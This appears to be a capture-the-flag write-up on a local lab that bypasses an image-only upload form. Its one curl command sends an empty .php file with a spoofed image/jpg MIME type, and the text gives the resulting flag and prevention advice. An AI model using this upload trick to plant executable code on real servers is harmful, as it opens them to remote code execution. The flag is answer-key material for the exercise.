# MIME Sniffing Exploit

## Overview

This demonstrates a MIME sniffing exploit, which takes advantage of how some web servers handle file uploads. By disguising a malicious file, in this case as an image, an attacker can potentially execute arbitrary code on the server.

### Vulnerable File Upload

When navigating to the upload page (e.g., `http://127.0.0.1:8080/?page=upload`), we tried uploading different image formats and noticed that images with the extensions `.jpg` and `.jpeg` were accepted.

Inspecting the HTML, we see the following form snippet:

```html
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>
```

The form allows users to upload image files (e.g., `.jpg` and `.jpeg`), but there is no indication that the server verifies whether the uploaded file is truly an image based on its contents. This means an attacker could upload a file with a different type, such as a `.php` file containing malicious code. By changing the file's extension and telling the server that it is an image (e.g., by specifying the MIME type as `image/jpg`), the attacker can trick the system and bypass the restrictions that are meant to only allow image files. This can result in the server executing harmful code.

## Executing the Exploit

The following command can be used to upload a blank `.php` file, which could potentially contain a malicious script, while disguising it as an image:

```bash
touch malicious.php && curl -F "Upload=Upload" -F "uploaded=@malicious.php;type=image/jpg" http://127.0.0.1:8080/index.php?page=upload -s -o flag.txt && grep flag flag.txt && rm malicious.php flag.txt
```

### Breakdown of the Command:
- `curl -F "Upload=Upload"`: Uses `curl` to submit the form with the "Upload" button clicked.
- `-F "uploaded=@malicious.php;type=image/jpg"`: Uploads the `malicious.php` file while specifying the MIME type as `image/jpg` to trick the server into accepting it.
- `-s -o flag.txt`: Silently (`-s`) saves the server’s response to an output file (`-o flag.txt`).
- `grep flag flag.txt`: Extracts the flag from the response.
- `rm malicious.php flag.txt`: Cleans up by removing the malicious file and flag output.

### Flag Output

Running the above command yields the following flag:
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Prevention

1. **Strict MIME Type Validation**: Ensure the server checks the actual content of the uploaded file, not just the extension or MIME type specified by the client.
2. **Use a Whitelist**: Only allow specific file types, both by extension and MIME type. Reject any other types.
3. **Disable MIME Sniffing**: Add security headers like `X-Content-Type-Options: nosniff` to prevent browsers from trying to guess the MIME type.

## Resources

- [What Is MIME Sniffing?](https://www.keycdn.com/support/what-is-mime-sniffing)
